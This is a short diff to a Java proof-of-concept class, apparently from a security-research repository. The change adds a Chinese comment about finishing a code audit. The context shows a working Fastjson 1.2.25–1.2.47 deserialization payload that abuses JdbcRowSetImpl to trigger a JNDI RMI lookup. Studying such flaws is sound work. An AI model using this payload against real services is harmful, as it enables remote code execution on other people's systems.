@@ -27,6 +27,7 @@ public class Fastjson1247 {
 
         注：Fastjson 1.2.25-1.2.32 需要AutoTypeSupport关闭，Fastjson 1.2.33-1.2.47任意都可以
 
+        具体代码审计今天下午搞完
          */
         String payload ="{{\"@type\": \"java.lang.Class\",\"val\": \"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"rmi://localhost/obj\",\"autoCommit\": true}}";
         JSON.parse(payload);
